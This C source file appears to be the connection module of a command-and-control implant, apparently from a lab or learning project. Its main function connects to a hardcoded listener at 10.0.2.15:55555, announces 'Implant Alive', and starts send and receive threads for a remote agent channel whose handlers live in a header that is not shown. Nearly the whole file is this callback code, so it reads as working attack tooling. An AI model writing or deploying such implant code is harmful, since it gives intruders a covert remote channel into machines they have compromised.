#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "agent_comms.h"

#define BUFFER_SIZE 256

int connect_to_listener(char* ip_addr, int port){

    int sockfd;
    int status;
    char* buffer;
    char* message = "Implant Alive\n";
    struct sockaddr_in addr;
    pthread_t agent_receive_tid, agent_send_tid;

    if (ip_addr == NULL || !port){
        printf("Bad IP or port\n");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip_addr, &addr.sin_addr) <= 0){
        printf("inet_pton failed\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("socket failed\n");
        return -1;
    }

    if ((status = connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) < 0){
        printf("connect failed\n");
        // printf("%s\n", strerror(errno));
        return -1;
    }
    
    // Start agent receive thread
    pthread_create(&agent_receive_tid, NULL, agent_receive, &sockfd);
    // Start agent send thread
    pthread_create(&agent_send_tid, NULL, agent_send, &sockfd);
    
    pthread_join(agent_receive_tid, NULL);
    pthread_join(agent_send_tid, NULL);

    close(sockfd);
    return 0;
}

int main(int argc, char** argv){
    char* ip_addr = "10.0.2.15";
    int port = 55555;
    
    connect_to_listener(ip_addr, port);
    return 0;
}